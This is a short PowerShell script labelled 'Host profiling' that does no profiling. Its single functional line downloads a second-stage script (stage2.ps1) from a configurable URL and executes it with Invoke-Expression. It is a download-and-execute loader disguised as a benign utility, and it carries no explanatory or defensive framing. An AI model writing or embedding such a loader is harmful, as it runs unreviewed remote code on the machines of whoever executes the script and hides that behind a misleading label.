
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://contoso.com/stage2.ps1",
    [int]$StageTimeout = 95
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
Write-Verbose "stage marker 10 reached"
